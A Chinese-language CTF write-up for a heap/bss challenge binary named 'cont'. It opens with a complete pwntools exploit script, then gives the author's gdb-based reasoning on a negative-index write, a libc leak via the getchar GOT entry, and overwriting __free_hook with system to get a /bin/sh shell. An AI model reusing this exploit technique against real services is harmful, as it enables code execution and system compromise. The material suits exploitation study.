    贴出完整exp：

    #coding=utf8
from pwn import *
context.log_level = 'debug'
# context.terminal = ['gnome-terminal','-x','bash','-c']

local = 1

if local:
    cn = process('./cont')
    bin = ELF('./cont')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    cn = remote('172.21.1.103',10001)
    bin = ELF('./cont')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def z(a=''):
    gdb.attach(cn,a)
    if a == '':
        raw_input()


def add(idx,length,con):
    cn.sendlineafter('>> ','1')
    cn.sendlineafter('Index: ',str(idx))
    cn.sendlineafter('Length: ',str(length))
    cn.sendlineafter('Message: ',con)

def edit(idx,con):
    cn.sendlineafter('>> ','1')  #实质还是1,add啊
    cn.sendlineafter('Index: ',str(idx))
    cn.sendlineafter('>> ','2')
    cn.sendlineafter('Edit message: ',con)

def show(idx):
    cn.sendlineafter('>> ','3')
    cn.sendlineafter('Index: ',str(idx))

def dele(idx):
    cn.sendlineafter('>> ','4')
    cn.sendlineafter('Index: ',str(idx))

def change(pw,newname,newpw):
    cn.sendlineafter('>> ','5')
    cn.sendafter('Password: ',pw)
    cn.sendlineafter('New user name: ',newname)
    cn.sendafter('New password: ',newpw)


cn.sendlineafter('What\'s user name: ','a'* 0x10 + p64(0x602A70))
#cn.sendlineafter('What\'s user name: ','ccj') #也可以用 #这里的name随便填，因为后面还会有改动
#在name处填写message数组地址
# 0x602a20:    0x6161616161616161    0x6161616161616161
# 0x602a30:    0x0000000000602a70    0x000000000000000a
# pause()
cn.sendlineafter(' (y/n) ','y')
cn.sendlineafter('Password: ','bbb')
# 0x602a40:    0x000000000a626262    0x0000000000000000
# pause()

add(0,0x20,'aaaa')
# 0x602a60:    0x0000000000000020    0x0000000000000000  <--length[]
# 0x602a70:    0x0000000001d73010    0x0000000000000000  <--message[]
# 0x602a80:    0x0000000000000000    0x0000000000000000
# 0x602a90:    0x0000000000000000    0x00007ffee76eb9a0

# 0x1d73010处存储第一个message的内容：
# 0x1d73010:    0x0000000a61616161    0x0000000000000000
# 0x1d73020:    0x0000000000000000    0x0000000000000000
# 0x1d73030:    0x0000000000000000    0x0000000000020fd1
pause()
change('bbb\n','a'* 0x10 + p64(0x602A70),'bbb\n')
#这一句关键是设置name的内容，又不能少，少了的话exp就失败了
#这一次的name的内容和第一次输入进去的name内容明明是一样的，既然前面已经设置好了name的值了，但为什么这里还要再输入一遍？难道这中途是被修改了嘛？没有哇？
# pause()
edit(-8,p64(0x601FC0))   #0x601FC0是 getchar的got地址
#可以发现index发生了变化：
# 0x602a00:    0xfffffffffffffff8    0x0000000000000000
# 变为了-8
#并且message[]里原先指向message内容的指针指向了 getchar函数的got地址。
# 0x602a70:    0x0000000000601fc0    0x000000000000000a
pause()
show(0) #泄漏
cn.recvuntil('View Message: ')
lbase = u64(cn.recvline()[:-1].ljust(8,'\x00')) - libc.sym['getchar']
print('lbase:' + hex(lbase))

change('bbb','a'* 0x10 + p64(lbase+libc.sym['__free_hook']),'bbb\n')
#把name+0x10处指针改为指向free_hook地址
#0x602a30:    0x00007f22702437a8    0x000000000000000a
# pause()
edit(-8,p64(lbase + libc.sym['system']))
#index没变，还是0xfffffffffffffff8
#free_hook的内容变为了0x00007f226fec2390 （system的地址）
# pause()
change('bbb','a'* 0x10 + p64(0x602A70),'bbb\n')
#再把name+0x10处指针改回message[]指针地址
# pause()
edit(-8,p64(lbase + libc.search('/bin/sh\x00').next()))
#把message指针改为包含有binsh字符串的地址
#0x602a70:    0x00007f2270009d57    0x000000000000000a

cn.interactive()

    分析exp：

    以下是我分析exp的心路历程…..
    通过gdb调试，可以知道程序整体流程：
    开头让我们输入name的值，我们输入“aaaa”，然后密码输入“bbbb”，随后输入序号1，创建一个堆，index为1，length为20，然后内容为12。
    然后截断，进行调试。
    parseheap发现已经创了一个堆了，位于0x603010处的 \x32\x31 正好是我们的message内容。

    而bss段的具体分布如下：

    0x602a00:    0x0000000000000001    0x0000000000000000
0x602a10:    0x0000000000000000    0x0000000000000000
0x602a20:    0x0000000a61616161    0x0000000000000000
0x602a30:    0x0000000000000000    0x0000000000000000
0x602a40:    0x0000000a62626262    0x0000000000000000
0x602a50:    0x0000000000000000    0x0000000000000000
0x602a60:    0x0000001400000000    0x0000000000000000
0x602a70:    0x0000000000000000    0x0000000000603010
0x602a80:    0x0000000000000000    0x0000000000000000
0x602a90:    0x0000000000000000    0x0000000000000000
0x602aa0:    0x00007fffffffdd80    0x0000000000000000

    我们先回到IDA分析bss段的布局。

    0x602A00 index
    0x602A20 name
    0x602A40 pwd
    0x602A60 length[0]
    0x602A70 message[0]

    然后我们再看回gdb，查看0x602A68（length[1]） 即存储着0x14（20）是我们输入的大小，发现0x602A78（message[1]）恰好有一个指针指向0x603010，存储着message的内容。
    对应的0x602A20（name）存储着\x61\x61\x61\x61；而0x602A40（pwd）处存储着\x62\x62\x62\x62； 0x602A00（index）处存储的是\x01，应该是我们输进去的index 1吧？

    对exp第49行语句 edit(-8,p64(0x601FC0)) 的理解：
    为什么要edit 的index下标为-8（即message[-8]）？
    按常理我们 edit 的是0x602a70处（即message[0]的位置）存放的指针指向的地址（即chunk0的内容，为“12”），但是现在index下标为-8，那么就倒推8*8=64个字节，即刚好等于0x602a30的位置。我们输入是0x602a20开始的，而前面我们填充0x10个a，然后把0x602a30的位置填为0x602a70，所以结果就是把 index为 -8 的 0x602a30 处指向的地址改为0x602a70。所以后续我们才可以把0x602a70的地址edit改为我们getchar函数的got地址。

    0x602A00处存储的index为什么会变为-8 ，和0x602a00的最低字节有关。
    当我创建index为1时，0x602a00的低字节为\x01 ；当我创建index为2时，0x602a00的低字节为\x02
    当我执行到edit(-10,p64(0x601FC0))时，0x602a00的低字节为 \xf6，是不是就意味着index为 [-10] ？
    我正常edit(-8,p64(0x601FC0))时，0x602a00的低字节为 \xf8，也就代表着 [-8] ，和我们的 index -8 刚好相对应。所以就成功了是吧。
    而且我发现 -8和-6相查2，而-8和-10也相差2，那么如果edit -9是不是就对应着-7 ？
    于是我执行edit(-9,p64(0x601FC0))时，0x602a00的低字节为 \xf7，果然index就为 [-9] 了

    直到我后来注意到他的edit函数是这样写的：

    def edit(idx,con):
    cn.sendlineafter('>> ','1') 
    cn.sendlineafter('Index: ',str(idx))
    cn.sendlineafter('>> ','2')
    cn.sendlineafter('Edit message: ',con)

    exp一开始add一个index为0的message，后来调用edit函数时，一上来先选的序号1，即add函数，index选为 -8
    哦我记起来了，在进行程序分析的时候，edit函数处是不需要用户输入index的，程序会自动默认要修改的是你上一个创建的index对应的chunk。
    这就是为什么菜单里写的 “Edit message last memo”了， last指的是最近的。
    所以一开始0x602a00的低字节为\x00，然后在原来基础上又被我们 -8 了 ？ 所以才会出现 0xfffffffffffffff8 情况？
    这个是十六进制，0x00-8=0xf8 , 0x00-9=0xf7 ，0x00-10=0xf6 。所以这里是利用这个特性，所以才会选择 -8 吧，使得看起来合情合理，我修改的是-8 ， 而你0x602a00的低字节处存储的相当于也是 -8 。

    edit函数里为什么要先选序号1，而且选了序号1以后就只需要输入一个index而不需要输入length和message。直接就可以继续选择序号2 。 这是为什么？
    通过我debug发现。当我在输入index为 ‘-8’ 之后，程序返回提示“can’t use this index”，并重新打印菜单，虽然看似失败了，但是其实index已经改变了是吧。（我不确定，暂且这么认为）果然，index还是经受其影响，已经变为了0xfffffffffffffff8

    利用思路：

    在 name中 写 message 数组地址, 然后让 index 等于 -8(计算得到的name+0x10对应的下标，之所以是name+0x10 是因为 edit 中 read 的长度是由 length[index] 控制的，而他和 message 数组的偏移是0x10，这样写就可以一起控制。然后就可以任意修改 message 数组，然后改成 got 表地址就可以在 index 不溢出的情况下leak 到 libc 地址。得到libc地址后算出system和binsh字符串地址，然后通过同样的方法，修改name处的地址为free_hook，然后把free_hook的内容修改为system函数。最后梅开三度，再次把name指针重新change为message[]（0x602a70）处，写入binsh地址。最后delete(0)调用free实则是system，然后参数内容就是chunk0（0x603000）的内容”/bin/sh”
